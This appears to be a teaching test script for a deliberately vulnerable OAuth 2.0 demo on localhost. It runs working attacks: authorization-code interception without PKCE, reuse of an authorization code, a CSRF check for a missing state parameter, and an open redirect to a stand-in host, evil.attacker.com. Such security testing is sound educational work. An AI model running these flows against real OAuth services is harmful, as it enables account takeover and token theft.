#!/usr/bin/env python3
"""
OAuth 2.0 Vulnerability Testing Script
Tests all attack scenarios against the vulnerable implementation
"""

import requests
import json
import re
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Configuration
VULN_AUTH_SERVER = "http://localhost:4000"
VULN_CLIENT = "http://localhost:3000"
USERNAME = "demo"
PASSWORD = "password123"

def print_header(title):
    print(f"\n{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.RED}🔴 {title}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}\n")

def print_step(step_num, description):
    print(f"{Fore.YELLOW}Step {step_num}: {description}{Style.RESET_ALL}")

def print_vuln(message):
    print(f"{Fore.RED}   ✗ {message}{Style.RESET_ALL}")

def print_success(message):
    print(f"{Fore.GREEN}   ✓ {message}{Style.RESET_ALL}")

def print_info(message):
    print(f"{Fore.CYAN}   ℹ {message}{Style.RESET_ALL}")

# ============================================================
# SCENARIO 1: Authorization Code Interception
# ============================================================
def test_code_interception():
    print_header("SCENARIO 1: Authorization Code Interception Attack")
    
    session = requests.Session()
    
    # Step 1: Login
    print_step(1, "Authenticating user")
    login_data = {
        "username": USERNAME,
        "password": PASSWORD
    }
    login_response = session.post(f"{VULN_AUTH_SERVER}/login", data=login_data)
    print_info(f"Login status: {login_response.status_code}")
    
    # Step 2: Start OAuth flow
    print_step(2, "Initiating OAuth authorization")
    auth_params = {
        "response_type": "code",
        "client_id": "vulnerable-client-app",
        "redirect_uri": f"{VULN_CLIENT}/callback"
    }
    auth_url = f"{VULN_AUTH_SERVER}/authorize"
    auth_response = session.get(auth_url, params=auth_params)
    
    # Step 3: User approves (auto-submit form)
    print_step(3, "User approves authorization")
    approve_data = {
        "client_id": "vulnerable-client-app",
        "redirect_uri": f"{VULN_CLIENT}/callback",
        "response_type": "code",
        "scope": "profile",
        "approve": "true"
    }
    
    # Don't follow redirects so we can capture the authorization code
    approval_response = session.post(auth_url, data=approve_data, allow_redirects=False)
    
    # Extract authorization code from Location header
    if approval_response.status_code in [302, 303]:
        location = approval_response.headers.get('Location', '')
        parsed_url = urlparse(location)
        params = parse_qs(parsed_url.query)
        
        if 'code' in params:
            auth_code = params['code'][0]
            print_vuln(f"Authorization code EXPOSED in redirect: {auth_code}")
            print_vuln("Code visible in browser history, logs, and referrer headers")
            
            # Step 4: Attacker intercepts and uses the code
            print_step(4, "🎭 ATTACKER intercepts and exchanges code for token")
            
            # Create new session (simulating attacker)
            attacker_session = requests.Session()
            
            token_data = {
                "grant_type": "authorization_code",
                "code": auth_code,
                "client_id": "vulnerable-client-app",
                "redirect_uri": f"{VULN_CLIENT}/callback"
                # NOTE: No code_verifier sent - should fail if PKCE was enforced
            }
            
            token_response = attacker_session.post(f"{VULN_AUTH_SERVER}/token", data=token_data)
            
            if token_response.status_code == 200:
                token_json = token_response.json()
                access_token = token_json.get('access_token')
                
                if access_token:
                    print_vuln(f"ATTACK SUCCESSFUL! Got access token: {access_token[:20]}...")
                    print_vuln("No PKCE validation - anyone with code can get token!")
                    
                    # Step 5: Access user data
                    print_step(5, "🎭 ATTACKER accesses user data")
                    
                    headers = {"Authorization": f"Bearer {access_token}"}
                    userinfo_response = attacker_session.get(f"{VULN_AUTH_SERVER}/userinfo", headers=headers)
                    
                    if userinfo_response.status_code == 200:
                        user_data = userinfo_response.json()
                        print_vuln("Successfully retrieved victim's data:")
                        print(f"       {json.dumps(user_data, indent=6)}")
                        print_success("Attack fully successful - user account compromised!")
                        return True
            else:
                print_info(f"Token exchange failed: {token_response.status_code}")
        else:
            print_info("No authorization code in redirect")
    else:
        print_info(f"Unexpected status code: {approval_response.status_code}")
    
    return False

# ============================================================
# SCENARIO 2: CSRF Attack (No State Parameter)
# ============================================================
def test_csrf_attack():
    print_header("SCENARIO 2: CSRF Attack - No State Parameter")
    
    print_step(1, "Testing OAuth flow WITHOUT state parameter")
    
    session = requests.Session()
    
    # Login first
    login_data = {"username": USERNAME, "password": PASSWORD}
    session.post(f"{VULN_AUTH_SERVER}/login", data=login_data)
    
    # Try authorization without state
    auth_params = {
        "response_type": "code",
        "client_id": "vulnerable-client-app",
        "redirect_uri": f"{VULN_CLIENT}/callback"
        # NOTE: No state parameter!
    }
    
    auth_response = session.get(f"{VULN_AUTH_SERVER}/authorize", params=auth_params)
    
    if auth_response.status_code == 200:
        if "state" not in auth_response.text.lower() or "WARNING: No state parameter" in auth_response.text:
            print_vuln("Server accepts requests WITHOUT state parameter")
            print_vuln("Application vulnerable to CSRF attacks")
            print_vuln("Attacker can trick victim into authorizing attacker's app")
            print_info("In a real CSRF attack:")
            print_info("  1. Attacker creates malicious page with OAuth link (no state)")
            print_info("  2. Victim clicks link while logged into auth server")
            print_info("  3. Victim unknowingly authorizes attacker's app")
            print_info("  4. Authorization code goes to attacker")
            return True
    
    return False

# ============================================================
# SCENARIO 3: Open Redirect Vulnerability
# ============================================================
def test_open_redirect():
    print_header("SCENARIO 3: Open Redirect Vulnerability")
    
    print_step(1, "Testing redirect_uri validation with malicious domain")
    
    session = requests.Session()
    
    # Login
    login_data = {"username": USERNAME, "password": PASSWORD}
    session.post(f"{VULN_AUTH_SERVER}/login", data=login_data)
    
    # Try with evil redirect URI
    evil_redirect = "http://evil.attacker.com/steal"
    
    approve_data = {
        "client_id": "vulnerable-client-app",
        "redirect_uri": evil_redirect,  # Malicious redirect!
        "response_type": "code",
        "scope": "profile",
        "approve": "true"
    }
    
    print_info(f"Attempting redirect to: {evil_redirect}")
    
    response = session.post(f"{VULN_AUTH_SERVER}/authorize", data=approve_data, allow_redirects=False)
    
    if response.status_code in [302, 303]:
        location = response.headers.get('Location', '')
        if 'evil' in location or 'attacker' in location:
            print_vuln("VULNERABILITY CONFIRMED!")
            print_vuln(f"Server redirects to attacker domain: {location}")
            print_vuln("Authorization code would be sent to attacker!")
            print_vuln("No whitelist validation for redirect_uri")
            return True
        else:
            print_success("Redirect blocked (may be validated)")
    else:
        print_info(f"Response status: {response.status_code}")
    
    return False

# ============================================================
# SCENARIO 4: Token Replay Attack
# ============================================================
def test_token_replay():
    print_header("SCENARIO 4: Authorization Code Replay Attack")
    
    session = requests.Session()
    
    # Get an authorization code first
    login_data = {"username": USERNAME, "password": PASSWORD}
    session.post(f"{VULN_AUTH_SERVER}/login", data=login_data)
    
    auth_params = {
        "response_type": "code",
        "client_id": "vulnerable-client-app",
        "redirect_uri": f"{VULN_CLIENT}/callback"
    }
    session.get(f"{VULN_AUTH_SERVER}/authorize", params=auth_params)
    
    approve_data = {
        "client_id": "vulnerable-client-app",
        "redirect_uri": f"{VULN_CLIENT}/callback",
        "response_type": "code",
        "scope": "profile",
        "approve": "true"
    }
    
    approval_response = session.post(f"{VULN_AUTH_SERVER}/authorize", data=approve_data, allow_redirects=False)
    
    if approval_response.status_code in [302, 303]:
        location = approval_response.headers.get('Location', '')
        parsed_url = urlparse(location)
        params = parse_qs(parsed_url.query)
        
        if 'code' in params:
            auth_code = params['code'][0]
            print_info(f"Got authorization code: {auth_code}")
            
            # Use it once
            print_step(1, "Using authorization code for the first time")
            token_data = {
                "grant_type": "authorization_code",
                "code": auth_code,
                "client_id": "vulnerable-client-app",
                "redirect_uri": f"{VULN_CLIENT}/callback"
            }
            
            first_response = session.post(f"{VULN_AUTH_SERVER}/token", data=token_data)
            if first_response.status_code == 200:
                print_success("First use successful")
                
                # Try to use it again
                print_step(2, "Attempting to REUSE the same code")
                second_response = session.post(f"{VULN_AUTH_SERVER}/token", data=token_data)
                
                if second_response.status_code == 200:
                    token_json = second_response.json()
                    if 'access_token' in token_json:
                        print_vuln("VULNERABILITY: Code can be reused!")
                        print_vuln("Got another access token with same code")
                        print_vuln("Authorization codes should be single-use only")
                        return True
                else:
                    print_success("Code replay blocked (single-use enforced)")
    
    return False

# ============================================================
# SCENARIO 5: Client-Side Token Exposure
# ============================================================
def test_client_side_exposure():
    print_header("SCENARIO 5: Client-Side Token Storage & Exposure")
    
    print_vuln("Vulnerable client implementation stores tokens in browser:")
    print_vuln("  • Access tokens stored in localStorage")
    print_vuln("  • Tokens visible in browser console logs")
    print_vuln("  • Token exchange happens in browser (client-side)")
    print_vuln("  • No HttpOnly cookies used")
    print()
    print_info("Security issues:")
    print_info("  1. XSS attacks can steal tokens from localStorage")
    print_info("  2. Malicious browser extensions can access localStorage")
    print_info("  3. Tokens persist across browser sessions")
    print_info("  4. Console logs expose sensitive data")
    print()
    print_info("To verify manually:")
    print_info("  1. Open http://localhost:3000 in browser")
    print_info("  2. Complete OAuth login flow")
    print_info("  3. Open browser DevTools console")
    print_info("  4. Run: localStorage.getItem('access_token')")
    print_info("  5. See the access token exposed!")
    
    return True

# ============================================================
# SCENARIO 6: Sensitive Data in Logs
# ============================================================
def test_sensitive_logging():
    print_header("SCENARIO 6: Sensitive Data Exposure in Logs")
    
    print_vuln("Server logs contain sensitive information:")
    print_vuln("  • Plain text passwords")
    print_vuln("  • Authorization codes")
    print_vuln("  • Access tokens")
    print_vuln("  • PKCE code_verifier (when used)")
    print_vuln("  • User session IDs")
    print()
    print_info("Check the auth server terminal output")
    print_info("You'll see [DEBUG] logs with sensitive data")
    print_info("In production, this data could be:")
    print_info("  • Stored in log files")
    print_info("  • Sent to log aggregation services")
    print_info("  • Accessible to operations team")
    print_info("  • Exposed if logs are compromised")
    
    return True

# ============================================================
# Main Test Runner
# ============================================================
def main():
    print(f"\n{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.RED}  🚨 OAuth 2.0 Vulnerability Testing Suite{Style.RESET_ALL}")
    print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}\n")
    
    print(f"{Fore.YELLOW}Testing vulnerable OAuth 2.0 implementation...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Auth Server: {VULN_AUTH_SERVER}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Client App: {VULN_CLIENT}{Style.RESET_ALL}\n")
    
    results = {}
    
    # Run all tests
    try:
        results['Code Interception'] = test_code_interception()
        results['CSRF Attack'] = test_csrf_attack()
        results['Open Redirect'] = test_open_redirect()
        results['Token Replay'] = test_token_replay()
        results['Client-Side Exposure'] = test_client_side_exposure()
        results['Sensitive Logging'] = test_sensitive_logging()
    except Exception as e:
        print(f"{Fore.RED}Error during testing: {e}{Style.RESET_ALL}")
    
    # Summary
    print(f"\n{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.RED}📊 VULNERABILITY TEST SUMMARY{Style.RESET_ALL}")
    print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}\n")
    
    print(f"{Fore.RED}Critical Vulnerabilities Confirmed:{Style.RESET_ALL}\n")
    
    for test_name, result in results.items():
        status = "✗ VULNERABLE" if result else "? INCONCLUSIVE"
        color = Fore.RED if result else Fore.YELLOW
        print(f"{color}  {status}: {test_name}{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}Additional known vulnerabilities:{Style.RESET_ALL}")
    print(f"{Fore.RED}  ✗ No token expiration validation{Style.RESET_ALL}")
    print(f"{Fore.RED}  ✗ Weak password storage (plain text){Style.RESET_ALL}")
    print(f"{Fore.RED}  ✗ No rate limiting{Style.RESET_ALL}")
    print(f"{Fore.RED}  ✗ No HTTPS enforcement{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}Compare with secure implementation at http://localhost:3001{Style.RESET_ALL}\n")

if __name__ == "__main__":
    main()
